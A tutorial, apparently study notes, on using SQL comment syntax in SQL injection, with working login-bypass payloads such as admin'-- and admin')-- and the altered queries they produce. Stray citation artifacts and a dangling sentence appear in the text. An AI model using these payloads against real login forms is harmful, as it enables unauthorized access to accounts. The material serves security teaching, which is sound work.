# Using Comments in SQL Injection

In many SQL Injection scenarios, simply injecting quotes or logical operators is not enough. Sometimes the original query contains extra conditions, parenthesis, or trailing characters that break our payload and cause syntax errors.

To solve this problem, attackers commonly use:
```text
SQL Comments
```

Comments allow us to:
- Ignore the remaining part of the original query
- Prevent syntax errors
- Bypass additional conditions
- Subvert query logic more effectively

This technique is heavily used during:
- Authentication bypass
- Login exploitation
- SQL Injection payload crafting

---

# SQL Comments

Just like programming languages, SQL supports comments.

Comments are normally used by developers to:
- Document queries
- Explain logic
- Temporarily disable parts of SQL code

Attackers abuse comments to:
```text
Ignore unwanted parts of SQL queries
```

# Types of SQL Comments in MySQL

MySQL supports several comment styles:

| Comment Type | Example |
|---|---|
| Double Dash | `-- ` |
| Hash | `#` |
| Inline Comment | `/* comment */` |

# Double Dash Comment (`-- `)

Example:

```sql
SELECT username FROM logins; -- Select usernames from the logins table
```

:contentReference[oaicite:2]{index=2}

Everything after:
```sql
-- 
```

is ignored by MySQL.

---

# Important Note About `--`

In MySQL:
```text
Two dashes alone are NOT enough
```

A space must follow them:

```sql
-- 
```

not:

```sql
--
```

# URL Encoding of Comments

Spaces in URLs are often encoded as:
```text
+
```

So attackers commonly use:

```sql
--+
```

or:

```sql
-- -
```

to ensure the comment works properly.

---

# Hash Comment (`#`)

Example:

```sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

:contentReference[oaicite:4]{index=4}

The database ignores everything after:
```sql
#
```

Meaning:
```sql
AND password = 'something'
```

never gets executed.

---

# Browser Encoding Issue with `#`

Inside browsers:
```text
# is treated as a URL fragment/tag
```

So it may not be sent to the server properly.

To bypass this:
```text
Use URL encoding
```

Encoded `#`:

```text
%23
```

# Using Comments for Authentication Bypass

Consider the original login query:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'something';
```

Attackers can inject:

```sql
admin'-- 
```

as the username.

:contentReference[oaicite:6]{index=6}

---

# Resulting Query

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Everything after:
```sql
-- 
```

becomes a comment and is ignored.

---

# What Happens Here?

The query effectively becomes:

```sql
SELECT * FROM logins WHERE username='admin'
```

The password check disappears completely.

So:
```text
Authentication succeeds without knowing the password
```

---

# Successful Login Example

Injected username:

```sql
admin'-- 
```

Password:
```text
anything
```

Result:
```text
Login successful as user: admin
```

# Another Example — Parenthesis Protection

Some applications use extra logic like:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hash';
```

:contentReference[oaicite:8]{index=8}

This query introduces:
- Parenthesis
- Additional conditions
- Password hashing

---

# Why Admin Login Fails

The query checks:

```sql
id > 1
```

If admin has:
```text
id = 1
```

then login always fails.

Even with correct credentials:

```text
admin / p@ssw0rd
```

authentication is denied.

:contentReference[oaicite:9]{index=9}

---

# Password Hashing Protection

Notice:

```text
Password is hashed before comparison
```

This prevents attackers from injecting into the password field because:
```text
Input changes before reaching SQL query
```

---

# Logging in as Another User

User:
```text
tom
```

works because:
```text
tom's ID > 1
```

# Attempting SQLi with Comments

Payload:

```sql
admin'-- 
```

Generated query:

```sql
SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password='hash';
```

:contentReference[oaicite:11]{index=11}

This causes:
```text
SQL syntax error
```

---

# Why Syntax Error Occurs

The issue:
```text
Parenthesis are unbalanced
```

Original query contains:

```sql
(
```

but after commenting:
```text
Closing parenthesis is missing
```

So SQL syntax breaks.

---

# Fixing the Query with Closing Parenthesis

Payload:

```sql
admin')-- 
```

:contentReference[oaicite:12]{index=12}

Now the query becomes:

```sql
SELECT * FROM logins where (username='admin')
```

:contentReference[oaicite:13]{index=13}

---

# Why This Works

The injected:
```sql
)
```

closes the original parenthesis correctly.

Then:
```sql
-- 
```

comments out the remaining query.

Final effect:
- `id > 1` check disappears
- Password check disappears
- Only username='admin' remains

Authentication succeeds.

Attackers fix this using:

# Why Comments Matter in SQL Injection

SQL comments are one of the most important tools during:
- Authentication bypass
- UNION attacks
- Blind SQL Injection
- Query repair
- Payload crafting

Without comments:
- Extra conditions may still execute
- Queries may fail due to syntax errors

Comments allow attackers to:
```text
Take control of the entire query flow
```
